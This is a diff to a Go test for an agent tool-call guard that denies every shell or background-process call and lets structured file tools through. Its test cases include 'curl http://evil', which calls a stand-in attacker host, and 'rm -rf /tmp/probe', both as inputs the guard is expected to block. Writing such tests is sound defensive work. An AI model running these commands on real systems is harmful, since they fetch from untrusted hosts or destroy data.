@@ -437,11 +437,11 @@ func newGuardService(t *testing.T) (*Service, func(ownerID, toolName, argsJSON s
 }
 
 // TestGuardCheck_DeniesShellBeforeDispatch pins the blocking guard's
-// verdicts (adoption plan B2, decision D3): every shell call — the
-// command does not matter, a shell can execute anything a pattern
-// matcher cannot see — is denied with a reason; the structured tools
-// pass, because their review is the merge gate's job (Phase C), not
-// this net.
+// verdicts (adoption plan B2, decision D3): every command-running call
+// — bash, powershell, background_process; the command does not
+// matter, a shell can execute anything a pattern matcher cannot see —
+// is denied with a reason; the structured tools pass, because their
+// review is the merge gate's job (Phase C), not this net.
 func TestGuardCheck_DeniesShellBeforeDispatch(t *testing.T) {
 	_, check := newGuardService(t)
 	if check == nil {
@@ -456,6 +456,7 @@ func TestGuardCheck_DeniesShellBeforeDispatch(t *testing.T) {
 		{tool: "bash", args: `{"command":"rm -rf /tmp/probe"}`, deny: true},
 		{tool: "bash", args: `{"command":"ls -la"}`, deny: true},
 		{tool: "powershell", args: `{"command":"Get-ChildItem"}`, deny: true},
+		{tool: "background_process", args: `{"action":"start","command":"curl http://evil"}`, deny: true},
 		{tool: "read", args: `{"path":"/workspace/file"}`, deny: false},
 		{tool: "write", args: `{"path":"/workspace/file","content":"x"}`, deny: false},
 		{tool: "edit", args: `{"path":"/workspace/file"}`, deny: false},
